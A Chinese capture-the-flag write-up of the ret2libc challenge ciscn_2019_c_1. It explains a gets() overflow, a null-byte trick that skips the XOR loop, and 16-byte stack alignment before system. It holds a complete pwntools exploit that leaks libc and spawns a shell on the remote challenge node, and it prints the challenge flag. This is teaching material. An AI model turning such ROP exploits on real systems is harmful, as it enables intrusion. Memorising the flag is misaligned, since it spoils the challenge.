# ciscn_2019_c_1

[题目地址](https://buuoj.cn/challenges#ciscn_2019_c_1)

每次普通的ret2libc总是要搞点变种。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

几乎啥也没开，入门题基操。进入main函数。

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  int __edflag;
  char *__block;
  int local_c;
  
  init(param_1);
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();
  while( true ) {
    while( true ) {
      fflush((FILE *)0x0);
      local_c = 0;
      __edflag = (int)&local_c;
      __block = "%d";
      __isoc99_scanf();
      getchar();
      if (local_c != 2) break;
      puts("I think you can do it by yourself");
      begin();
    }
    if (local_c == 3) break;
    if (local_c != 1) {
      puts("Something Wrong!");
      return 0;
    }
    encrypt(__block,__edflag);
    begin();
  }
  puts("Bye!");
  return 0;
}
```

不知道为啥ghidra里的scanf崩了，参数都没有放到函数里面。没啥大问题，看encrypt函数。

```c
void encrypt(char *__block,int __edflag)

{
  size_t sVar1;
  long i;
  ulong uVar2;
  undefined8 *puVar3;
  undefined8 local_58 [9];
  
  puVar3 = local_58;
  for (i = 6; i != 0; i = i + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets((char *)local_58);
  while( true ) {
    uVar2 = (ulong)x;
    sVar1 = strlen((char *)local_58);
    if (sVar1 <= uVar2) break;
    if ((*(char *)((long)local_58 + (ulong)x) < 'a') || ('z' < *(char *)((long)local_58 + (ulong)x))
       ) {
      if ((*(char *)((long)local_58 + (ulong)x) < 'A') ||
         ('Z' < *(char *)((long)local_58 + (ulong)x))) {
        if (('/' < *(char *)((long)local_58 + (ulong)x)) &&
           (*(char *)((long)local_58 + (ulong)x) < ':')) {
          *(byte *)((long)local_58 + (ulong)x) = *(byte *)((long)local_58 + (ulong)x) ^ 0xf;
        }
      }
      else {
        *(byte *)((long)local_58 + (ulong)x) = *(byte *)((long)local_58 + (ulong)x) ^ 0xe;
      }
    }
    else {
      *(byte *)((long)local_58 + (ulong)x) = *(byte *)((long)local_58 + (ulong)x) ^ 0xd;
    }
    x = x + 1;
  }
  puts("Ciphertext");
  puts((char *)local_58);
  return;
}
```

发现gets栈溢出。看起来可以直接搞了，然而下面的加密逻辑会把我们的payload搞乱。为了不让程序破坏gadgets，我们可以在payload前面加个\x00。因为[strlen](http://c.biancheng.net/c/strlen.html)函数从字符串的开头位置依次向后计数，直到遇见\0，那我们开始就是\0，返回长度不就是0了吗，满足while循环的break条件。直接放exp，全是基操。

```python
from pwn import *
p=remote("node4.buuoj.cn",26674)
pop_rdi=0x0000000000400c83
puts_got=0x00602020
puts_plt=0x004006e0
encrypt_addr=0x004009a0
system_offset=	-0x31580
bin_sh_offset=	0x1334da
payload=b'\x00'+b'a'*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt_addr)
p.sendlineafter("Input your choice!",'1')
p.sendlineafter("Input your Plaintext to be encrypted",payload)
p.recvuntil(b'\n\n')
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
system=puts_addr+system_offset
bin_sh=puts_addr+bin_sh_offset
payload=b'\00'+b'a'*0x57+p64(0x00000000004006b9)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(encrypt_addr)
p.sendlineafter("Input your Plaintext to be encrypted",payload)
p.interactive()
```

题目描述有一句“Ubuntu 18”，难道就是写来玩的？当然不是。ubuntu18下调用system函数需要[栈对齐](https://www.cnblogs.com/ZIKH26/articles/15996874.html)。为什么前面泄露地址不用？因为前面没有调用system，这个规则似乎是system函数独有的。而且这个对齐不是8字节，是16字节。64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。如果想要在ubuntu18以上的64位程序中执行system函数，必须要让执行system地址末尾是0。如果没有对齐，我们有两种办法：

1. 将system函数地址+1，此处的+1，即是把地址+1。+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐，跳过一条指令，自然就是把8变成0了）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止
2. 直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。

明显第二种更简单。这里正好也有ret的gadget 0x00000000004006b9。成功getshell。

### Flag
- flag{60eb0105-0b7f-4a0e-b936-2d0dfbfccfb2}